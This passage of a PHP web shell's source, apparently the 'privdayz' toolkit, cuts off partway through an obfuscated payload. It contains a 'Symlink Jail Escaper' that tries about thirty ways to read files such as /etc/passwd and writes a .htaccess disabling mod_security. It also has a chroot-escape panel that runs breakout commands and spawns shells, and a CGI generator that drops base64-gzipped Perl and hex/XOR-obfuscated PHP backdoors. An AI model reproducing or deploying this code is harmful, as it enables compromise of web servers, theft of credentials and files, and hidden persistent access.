    $try[] = function($t,$o){ // 17
     try { if(ini_get('open_basedir') && func_enabled('symlink')) { $ok=@symlink('/tmp/../'.$t,$o); return ['open_basedir race',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['open_basedir race',false,'ERROR']; }
     return ['open_basedir race',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 18
     try { $src='php://filter/read=convert.base64-encode/resource=' . $t; if(func_enabled('file_get_contents') && func_enabled('file_put_contents')) { $dat=@file_get_contents($src); $ok=false;if($dat)$ok=@file_put_contents($o.'.b64',$dat); return ['php://filter',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['php://filter',false,'ERROR']; }
     return ['php://filter',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 19
     try { $locs=['/tmp','/dev/shm'];$ok=false;foreach($locs as$loc){$spath=$loc.'/pz_s7m_ln_'.rand(10,99);if(func_enabled('symlink')){@symlink($t,$spath);if(is_link($spath))$ok=true;}} return ['tmp/devshm', $ok, $ok?'OK':'FAIL']; } catch(Exception $e) { return ['tmp/devshm',false,'ERROR']; }
     return ['tmp/devshm',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 20
     try { if(func_enabled('symlink') && func_enabled('copy')) { $ok=@symlink($t,$o);if($ok){@$cp=copy($o,$o.'_cp'); $ok2=@file_exists($o.'_cp');return ['symlink+copy',$ok2,$ok2?'OK':'FAIL'];} } } catch(Exception $e) { return ['symlink+copy',false,'ERROR']; }
     return ['symlink+copy',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 21
     try { if(func_enabled('symlink')) { $ok=@symlink('/proc/self/cwd/'.$t,$o);return ['/proc/self/cwd',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['/proc/self/cwd',false,'ERROR']; }
     return ['/proc/self/cwd',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 22
     try { if(func_enabled('file_put_contents')) { $r=false;for($i=1;$i<8;$i++){$r=@file_put_contents($o,str_repeat('*',$i));if($r){break;}}return ['putcontent fuzz',$r,$r?'OK':'FAIL']; }} catch(Exception $e) { return ['putcontent fuzz',false,'ERROR']; }
     return ['putcontent fuzz',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 23
     try { if(func_enabled('chmod')) { $ok=@file_exists($t);$r=$ok&&@chmod($t,0777);return ['chmod direct',$r,$r?'OK':'FAIL']; }} catch(Exception $e) { return ['chmod direct',false,'ERROR']; }
     return ['chmod direct',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 24
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('chmod')." 777 ".escapeshellarg($t);@shell_exec($c);$r=@is_writable($t);return ['chmod shell',$r,$r?'OK':'FAIL']; }} catch(Exception $e) { return ['chmod shell',false,'ERROR']; }
     return ['chmod shell',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 25
     try { if(func_enabled('dl')) { $ok=@dl($t);return ['dl()',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['dl()',false,'ERROR']; }
     return ['dl()',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 26
     try { if(func_enabled('copy')) { $ok=@file_exists($t)&&(@copy($t,$o.'bak'));return ['copy bak',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['copy bak',false,'ERROR']; }
     return ['copy bak',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 27
     try { if(func_enabled('proc_open')) { $c='cat '.escapeshellarg($t).' > '.escapeshellarg($o); $d=[1=>["pipe","w"],2=>["pipe","w"]]; $p=@proc_open($c,$d,$pipes); if(is_resource($p)){@fclose($pipes[1]);@fclose($pipes[2]);} $ok=@file_exists($o);return ['proc_open(cat>out)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['proc_open(cat>out)',false,'ERROR']; }
     return ['proc_open(cat>out)',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 28
     try { if(func_enabled('shell_exec')) { $c='echo '.escapeshellarg($t).' > '.escapeshellarg($o.'.echo');@shell_exec($c);$ok=@file_exists($o.'.echo');return ['echo > file',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['echo > file',false,'ERROR']; }
     return ['echo > file',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 29
     try { if(func_enabled('stream_copy_to_stream')) { $ok=@stream_copy_to_stream(fopen($t,'r'),fopen($o,'w'));return ['stream_copy_to_stream',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['stream_copy_to_stream',false,'ERROR']; }
     return ['stream_copy_to_stream',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 30
     try { if(func_enabled('link')) { $ok=@link($t,$o.'_hard');return ['hardlink',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['hardlink',false,'ERROR']; }
     return ['hardlink',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 31
     try { if(func_enabled('posix_mkfifo')) { $ok=@posix_mkfifo($o,0600);return ['posix_mkfifo',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['posix_mkfifo',false,'ERROR']; }
     return ['posix_mkfifo',false,'DISABLED'];
    };

    $log=[]; $success=false;
    foreach($try as $meth){
     $r = $meth($rtfccq,$lnname);
     $log[] = $r;
     if($r[1]) { 
       $success=true; 
          $htcode2 = <<<HT
# Ultra Universal Bypass .htaccess (2025)
Options +Indexes +FollowSymLinks +SymLinksIfOwnerMatch
DirectoryIndex 0xdeadbeef.php
ForceType text/plain
AddType text/plain .php .phtml .html .inc .bak .db .sql .config .env .json .xml
SetHandler default-handler

<FilesMatch ".*">
  ForceType text/plain
  SetHandler default-handler
  php_flag engine off
  Require all granted
</FilesMatch>

<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
  SecRuleEngine Off
</IfModule>

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]
  RewriteCond %{REQUEST_STATUS} 403
  RewriteRule ^ - [L,R=200]
</IfModule>

RemoveHandler .php .phtml .phar .inc .html .bak .db .sql .config .env .json .xml
Allow from all
Satisfy any
HT;
     $htdir = dirname($lnname);
     @file_put_contents($htdir . '/.htaccess', $htcode2);
       break; 
       
     }
    }
    return [$lnname, $log];
}
$outdir = __DIR__ . '/pr1vd4yz_s7m';
if(!is_dir($outdir)) @mkdir($outdir,0775,true);
$log = []; $final_link = '';
if(isset($_POST['pz_target_path'])) {
    $tp = trim($_POST['pz_target_path']);
    list($final_link,$log) = pz_s7m_methods($tp,$outdir);
}
?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-link"></i></div>
    <div class="pzcard-title">
    <b>Symlink Jail Escaper</b>
    <div class="pzcard-desc">30+ chained methods. All output in <b>/pr1vd4yz_s7m</b>.</div>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="POST" class="pzcard-formrow" autocomplete="off" style="margin-bottom:22px;">
    <input type="text" name="pz_target_path" class="pzcard-inp" placeholder="/etc/passwd, /home/user/config.php, ...">
    <button class="pzcard-btn" type="submit"><i class="fas fa-bolt"></i> SCAN</button>
    </form>
    <?php if($final_link): ?>
    <div class="pzcard-linkout">
     <b>First found:</b>
     <a href="<?= htmlspecialchars(str_replace($_SERVER['DOCUMENT_ROOT'],'',$final_link)) ?>" target="_blank" class="pzcard-linkbtn"><?= htmlspecialchars($final_link) ?></a>
     <div style="font-size:.94em;color:#888;margin-top:2px;">Manual open or <b>cat</b> to view</div>
    </div>
    <?php endif; ?>
    <?php if($log): ?>
    <div class="pzcard-loglist">
     <?php foreach($log as $r): ?>
       <div class="pzcard-logitem <?= $r[1]?'pzcard-logitem-success':'pzcard-logitem-fail' ?>">
       <b><?= htmlspecialchars($r[0]) ?></b> — <?= $r[1] ? 'OK' : 'FAIL' ?>
       <span style="font-size:.92em;color:#b71c1c;font-family:monospace;">[<?= htmlspecialchars($r[2]) ?>]</span>
       </div>
     <?php endforeach; ?>
    </div>
    <?php endif; ?>
  </div>
</div>
<?php elseif (isset($_GET['chrootescape'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-bug"></i></div>
    <div>
    <div class="pzcard-title"><b>chr00t/jailbreak</b></div>
    </div>
  </div>
  <div class="pzcard-content">
    <div class="pzcard-info">
    <i class="fas fa-user-astronaut"></i>
<span>
  Terminal: Sequentially executes advanced chroot/jail escape commands.
</span>
    </div>
    <form method="post">
    <button class="terminal-btn" name="r4pjs2run" type="submit">start</button>
    </form>
    <div class="terminal-shell" id="terminal-shell">
    <div id="terminal-log">
     <div class="terminal-prompt">chroot escape suite (v2025)</div>
     <?php if(isset($_POST['r4pjs2run'])): ?>
       <?php
       function xfnQ1v($pr1pr1v, $timeout=2, $max_output=8192) {
        $desc=[1=>['pipe','w'],2=>['pipe','w']];
        $proc=@proc_open($pr1pr1v." 2>&1",$desc,$pipes,null,null,["bypass_shell"=>false]);
        if(!is_resource($proc))return "[FAIL] proc_open failed";
        $out='';$st=microtime(true);
        stream_set_blocking($pipes[1],false);stream_set_blocking($pipes[2],false);
        while(true){
          $read=[$pipes[1],$pipes[2]];$w=null;$e=null;
          stream_select($read,$w,$e,0,200000);
          foreach($read as $r){$o=fread($r,2048);if($o===false)$o='';$out.=$o;if(strlen($out)>$max_output){$out.="\n[TRUNCATED]";break 2;}}
          if((microtime(true)-$st)>$timeout){$out.="\n[TIMEOUT]";break;}
          if(feof($pipes[1])&&feof($pipes[2]))break;
        }
        foreach($pipes as $p)@fclose($p);@proc_terminate($proc,9);@proc_close($proc);
        return $out;
       }
       $jBmcR = [ [ 'title'=>'/proc/self/fd/ Method', 'cmds'=>['ls -l /proc/self/fd/', 'cat /proc/self/fd/0', 'echo "FOO" >/proc/self/fd/1'], 'desc'=>'Abuse /proc/self/fd/* (open descriptors) to escape/jump mount points.', ], [ 'title'=>'Mount proc Overwrite', 'cmds'=>['mount -t proc proc /mnt 2>&1;ls /mnt'], 'desc'=>'Mounts new proc, tries to enumerate host PIDs/devices.' ], [ 'title'=>'Pivot_root/Chroot Trick', 'cmds'=>['mkdir -p /tmp/a /tmp/a/old;pivot_root /tmp/a /tmp/a/old 2>&1;ls /'], 'desc'=>'Classic pivot_root with empty dir to try escaping mount jail.' ], [ 'title'=>'Busybox/ash Escape', 'cmds'=>['busybox sh -i || busybox ash -i'], 'desc'=>'Attempts to spawn unrestricted Busybox shell.' ], [ 'title'=>'/dev/ Console Escape', 'cmds'=>['ls -l /dev/console;cat /dev/console 2>&1'], 'desc'=>'Tries to access /dev/console for raw escape.' ], [ 'title'=>'OverlayFS CVE-2015-1328', 'cmds'=>['mkdir /tmp/ovl; mkdir /tmp/ovl2; mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/ovl,workdir=/tmp/ovl2 /mnt 2>&1;ls /mnt'], 'desc'=>'Old overlayfs exploit for breaking out of chroot.' ], [ 'title'=>'/proc/$PPID Root Path', 'cmds'=>['cat /proc/1/root/etc/passwd 2>&1', 'ls -l /proc/1/root/'], 'desc'=>'Attempts to read files from outside the jail using /proc/1/root.' ], [ 'title'=>'Oldschool Symlink Bomb', 'cmds'=>['ln -s / /tmp/rootlink;ls /tmp/rootlink 2>&1'], 'desc'=>'Symlink root of real fs, enumerate for breakouts.' ], [ 'title'=>'/etc/mtab & /etc/fstab Dump', 'cmds'=>['cat /etc/mtab 2>&1', 'cat /etc/fstab 2>&1'], 'desc'=>'Checks for real mount info leak.' ], [ 'title'=>'SUID Binary Scan', 'cmds'=>['find / -perm -4000 -type f 2>/dev/null|head -n20'], 'desc'=>'List SUID binaries for local root escape vectors.' ], [ 'title'=>'Proc Stat Mountinfo', 'cmds'=>['cat /proc/self/mountinfo 2>&1'], 'desc'=>'Mountinfo leaks parent mount options/paths.' ], [ 'title'=>'/dev/mem & /dev/kmem', 'cmds'=>['ls -l /dev/mem /dev/kmem2>&1'], 'desc'=>'If open, can be abused for full escape (rare, but legacy).' ], [ 'title'=>'FUSE Escape', 'cmds'=>['fusermount -u /mnt 2>&1', 'fusermount -u / 2>&1'], 'desc'=>'If FUSE is active, can unmount or mount host dirs.' ], [ 'title'=>'Python os.open Trick', 'cmds'=>['python3 -c "import os;print(os.open(\'/etc/passwd\',0))" 2>&1'], 'desc'=>'Abuses python3 to open fds outside jail.' ], [ 'title'=>'Perl Jail Escape', 'cmds'=>['perl -e \'open F,"/etc/passwd";while(<F>){print}\' 2>&1'], 'desc'=>'Abuse perl to leak jail info or escape.' ], [ 'title'=>'LXC Breakout', 'cmds'=>['lxc-info -n name 2>&1', 'lxc-attach -n name -- id'], 'desc'=>'Checks for open LXC containers.' ], [ 'title'=>'Docker Host Enumeration', 'cmds'=>['cat /.dockerenv 2>&1', 'ls /run/.containerenv 2>&1'], 'desc'=>'Detects container environment and potential for host escape.' ], [ 'title'=>'procfs Hardlink/FD abuse', 'cmds'=>['ls -l /proc/self/fd', 'ls -l /proc/*/fd'], 'desc'=>'List open FDs in other processes (enumeration).' ], [ 'title'=>'Pivot dev/ptmx', 'cmds'=>['ls -l /dev/ptmx', 'cat /dev/ptmx 2>&1'], 'desc'=>'Escape via dev/ptmx if accessible.' ], [ 'title'=>'Escape with nc, curl, wget', 'cmds'=>['which nc;which curl;which wget'], 'desc'=>'Check if remote file tools are present (for pulling escape binaries).' ], [ 'title'=>'Shell/Interpreter Injection', 'cmds'=>['python -c "import pty;pty.spawn(\'/bin/sh\')" 2>&1','perl -e \'exec "/bin/sh";\' 2>&1','ruby -e \'exec \"/bin/sh\"\' 2>&1'], 'desc'=>'Tries to spawn interactive shells using interpreters.' ], [ 'title'=>'/proc/1/cwd / root', 'cmds'=>['ls -l /proc/1/cwd', 'ls -l /proc/1/root'], 'desc'=>'Enumerates host working dir and root dir.' ], ];
       $step=0;
       foreach($jBmcR as $method){
        echo '<div class="terminal-prompt"><b># '.$method['title'].'</b></div>';
        echo '<div class="terminal-out">'.$method['desc'].'</div>';
        foreach($method['cmds'] as $pr1pr1v){
          echo '<div class="terminal-cmd">&gt; '.htmlspecialchars($pr1pr1v).'</div>';
          try {
          $out = xfnQ1v($pr1pr1v,2,8192);
          $clean = trim((string)$out);
          $fail = (
            $clean === "" ||
            stripos($clean, '<?php') !== false ||
            preg_match('/<!DOCTYPE|<html|<head|<body|Permission denied|not found|fail|error|cannot|invalid|TRUNCATED|TIMEOUT/i', $clean)
          );
          if(!$fail){
            echo '<div class="terminal-out">'.htmlspecialchars($clean).'</div>';
          } else {
            echo '<div class="terminal-fail">[FAIL] '.htmlspecialchars($clean ? $clean : 'print fail').'</div>';
          }
          } catch(Exception $e) {
          echo '<div class="terminal-fail">[FAIL] Exception: '.$e->getMessage().'</div>';
          } catch(Exception $e) {
          echo '<div class="terminal-fail">[FAIL] Exception: '.$e->getMessage().'</div>';
          }
          $step++;
          usleep(25000);
        }
       }
       echo '<div class="terminal-prompt">[commands completed!]</div>';
       ?>
     <?php endif; ?>
    </div>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['multicgi'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-ghost"></i></div>
    <div>
    <div class="pzcard-title">
     <b>Multi-Bypass CGI Generator</b>
    </div>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" style="margin:22px 0 20px 0;">
    <input type="hidden" name="deploy_cgi_suite" value="1">
    <button class="pzcard-btn" type="submit">
     <i class="fas fa-biohazard"></i> create cgi 
    </button>
    </form>
    <?php
    function prvdz_rndstr($l=8) { $a='abcdefghijklmnopqrstuvwxyz0123456789'; $s=''; for($i=0;$i<$l;$i++) $s.=$a[rand(0,strlen($a)-1)]; return $s; }
    function prvdz_ascdump($s) { $r=''; foreach(str_split($s) as $c) $r.='&#'.ord($c).';'; return $r; }
    function prvdz_xor($s, $k=0x29) { $r=''; foreach(str_split($s) as $c) $r.=chr(ord($c)^$k); return pr1vdxs($r); }
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']!='off') ? 'https' : 'http';
    $domain = $protocol.'://'.$_SERVER['HTTP_HOST'];
    $dir   = rtrim(dirname($_SERVER['SCRIPT_NAME']),"/");
    $paths = [];
    if(isset($_POST['deploy_cgi_suite'])) {
    $cgidir = 'pr1vd4yz_cgi';
    if (!is_dir($cgidir)) @mkdir($cgidir,0755,true);
    $htaccess = <<<HTA
#by www.privdayz.com
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .d4yz
AddHandler cgi-script .d4yz
HTA;
    file_put_contents($cgidir.'/.htaccess', $htaccess);
    $plf = $cgidir.'/pr1v.d4yz';
    $pl_payload = '#!/usr/bin/perl   -I/usr/local/bandmin
use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';
    $asc = prvdz_ascdump($pl_payload);
    $f = fopen($plf,"w"); fwrite($f,html_entity_decode($asc)); fclose($f); chmod($plf,0755);
    $paths[] = ["CGI Perl Special", $plf];
    $phf = $cgidir.'/'.prvdz_rndstr(9).'.php';
    $cf1=prvdz_rndstr(5); $cf2=prvdz_rndstr(6); $cf3=prvdz_rndstr(7);
    $php_payload = <<<'PHP'
<?php $ve017499b24="366f3971556a482a3966526e26334d65666565626432336536666339316336392454704c237a313940425e6137642158";$v6789ef794d='';for($i=0;$i<strlen($ve017499b24);$i+=2){$v6789ef794d.=chr(hexdec($ve017499b24[$i].$ve017499b24[$i+1]));}$v6789ef794d=strrev($v6789ef794d);function fc726c15f02($be0647970224518ac6c7abd9ee879da39f7){return hex2bin($be0647970224518ac6c7abd9ee879da39f7);}function ffe80814332($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$e3d26b8f3fb594246Len=strlen($e3d26b8f3fb594246);$a297955cd64439654e8031e1e='';for($i=0;$i<strlen($be0647970224518ac6c7abd9ee879da39f7);$i++){$char=ord($be0647970224518ac6c7abd9ee879da39f7[$i]);$f93700fcddba236015a=ord($e3d26b8f3fb594246[$i%$e3d26b8f3fb594246Len]);$a297955cd64439654e8031e1e.=chr($char^$f93700fcddba236015a);}return $a297955cd64439654e8031e1e;}function f0fe28bdc4c($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$eb7f6b8164569b7c36e1=fc726c15f02($be0647970224518ac6c7abd9ee879da39f7);return ffe80814332($eb7f6b8164569b7c36e1,$e3d26b8f3fb594246);}$vfa90f6f087="641e145f1153486050575a0b682f07616b60266362413a0757016e555250391e507c6f175c673a081a7d3664430a334e6d15380652691e71080426127c45085c0c023f0008533a0754046e1c5651473b45700e1b4e703a411e7f362d450c33076a15461e412562285c501e463e5876780806506d0856516a540604381a52513a1d7b067a5f675065527f5e09440c33076a15384f56671e380e01265b7a45085c0a573f490e573a4e53066e1c555d395753796f13590e1e0f12141262456517003c7d1c0102023a735b6d4e1310416017654e5509651b5007394b05563e545355397c0713322a510d763059312d085d03041056033d26767665044f7f34436c06100d430e076e6c0a0d475f085c590d0304290d1a1a3b12554f76447a555a025278431d47002d31604a59494f205028044e41141f49110f4001524b1e4c060a0b5962474f1a3e0307163b1e2c1d5c515437451d4c033f212b5e43155622146e075f50050a5a0c0a591709110157565c555076554900264b5f4b25033908030259364e1747003d273d5b440e57231e784d57461645420107550e54400b170b015c462b57430d3705024927063a03034c536d125d045465202f4b551f517641245c19450c5d500746150006015d51505e160429574f00355c015a304a644549170d354016500830787749495a1377123b565d53111c4b02025f10400853121d1816172848440f310d5e58271f3b15034c503e4753515665212f555e08196f1561170005560a490202520c5d555e5356151e457c0b5616690456582c0f275c4b0e523154170d506e3238025c1b512b193a094d59130b0854164e5e515d1c4f160d070122441c5e72544952685b6701414f153d14570e526b7070025e0c463e16384b4e0c02444d0c1b571e505d080d175f45077a02455f311b79472d0e3c10110257200c135e052a2a7a0f014a5334592f464c42175e574f0f58154646481217001d1224575206685f0e5c3f17284d161c42214d01095d2d213250410e1d2a053a474d5f0c5f1907540401040a0707545454502e56155d7a14155e611139144d4f53744e591543722c7d4d1f194b2d02174b5d53224511534f0d035c404c0758555d007141080237085e5e2051305a124659731c374313372c271757084c21333c454b750c555c4b1418065b5316210a010324391b43470c0810113a0f21044b0116375c693d173f3060580c21127c44781508004f0008554a0754011e55535049535d61071142665115137146644109430769114803577273710b1d4b12785c65140c1a5200014f5706551f0b534e545757497c01144266501513714664400843076818390c173f30605b0c21177b5c65140c1a5201004f5f01490202574e545557497c021342665164113e0b27515a526d69115c1b506f736c0801490f7d41650800034f00085b4a03556e091203174502581607104263570b06795b655d085f05052c6e5114302134505e140339582408481a111d4a4a1d40044112105f154b050a2350471a7a17155864197c4a4f0e44785210455c79657b5f5e080b3a112604500b530a505f121809565c03160d5e0f4e661a5d1d261412171b1e27185708183e530b5a223623327a5e1e4664040f4d641f1e3c3311034210415c441111171b684755530031125045264a235941464d2a441042133062224d5e1b0b345929293350165f5a170f590b13515d5655555e077e0b470c3304011b714221584203532c01010a437c79265643524f2904744a0406585f0517485a005d55100a5e0b4d4e64560d537a440908631e7b12510e441b4e0052202a6a2e101f0e4c1f04264d57514b000f4a4f18165f5b07074d48544c7641431a2714570a2d17587b1109433642105e0e3062230d054a167d4331425c52070101515707071b